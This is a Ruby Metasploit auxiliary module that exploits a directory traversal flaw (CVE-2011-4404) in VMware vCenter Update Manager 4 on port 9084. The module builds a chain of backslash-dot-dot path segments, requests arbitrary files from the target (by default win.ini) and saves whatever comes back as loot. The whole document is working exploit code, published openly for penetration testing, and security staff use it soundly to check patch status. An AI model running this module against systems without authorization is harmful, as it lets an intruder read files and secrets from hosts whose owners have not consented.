##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "VMWare Update Manager 4 Directory Traversal",
      'Description'    => %q{
        This modules exploits a directory traversal vulnerability in VMWare Update Manager
        on port 9084.  Versions affected by this vulnerability: vCenter Update Manager
        4.1 prior to Update 2, vCenter Update Manager 4 Update 4.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Alexey Sintsov',  #Initial discovery, poc
          'sinn3r'           #Metasploit
        ],
      'References'     =>
        [
          ['CVE', '2011-4404'],
          ['EDB', '18138'],
          ['URL', 'http://www.vmware.com/security/advisories/VMSA-2011-0014.html'],
          ['URL', 'http://dsecrg.com/pages/vul/show.php?id=342']
        ],
      'DisclosureDate' => "Nov 21 2011"))

    register_options(
      [
        Opt::RPORT(9084),
        OptString.new('URIPATH', [true, 'URI path to the downloads', '/vci/downloads/']),
        OptString.new('FILE', [true, 'Define the remote file to download', 'windows\\win.ini'])
      ])
  end

  def run_host(ip)
    fname     = File.basename(datastore['FILE'])
    traversal = ".\\..\\..\\..\\..\\..\\..\\..\\"
    uri = normalize_uri(datastore['URIPATH']) + traversal + datastore['FILE']

    print_status("#{rhost}:#{rport} - Requesting: #{uri}")

    res = send_request_raw({
      'method' => 'GET',
      'uri'    => uri
    }, 25)

    # If there's no response, don't bother
    if res.nil? or res.body.empty?
      print_error("No content retrieved from: #{ip}")
      return
    end

    if res.code == 404
      print_error("#{rhost}:#{rport} - File not found")
      return
    else
      print_good("File retrieved from: #{ip}")
      p = store_loot("vmware.traversal.file", "application/octet-stream", rhost, res.to_s, fname)
      print_good("File stored in: #{p}")
    end
  end
end
